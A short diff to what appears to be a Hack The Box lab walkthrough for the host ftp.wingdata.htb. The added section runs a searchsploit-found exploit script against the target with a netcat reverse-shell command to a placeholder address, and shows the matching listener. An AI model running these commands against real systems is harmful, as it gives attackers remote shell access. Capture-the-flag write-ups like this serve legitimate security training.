@@ -39,6 +39,16 @@ ftp.wingdata.htb
 ### Searching Version exploit
 ![searchsploit](screenshots/searchsploit.png)
 
+### nc - reverseshell cmd
+```
+python3 52347.py -u http://ftp.wingdata.htb -c "nc x.x.x.x 4444 -e /bin/bash"
+
+```
+```
+nc -lvnp 4444
+```
+![nc](screenshots/nc-reverse.png)
+
 # 🔎 Phase 2 – Foothold Analysis
 
 The system exposes a backup/restore mechanism:
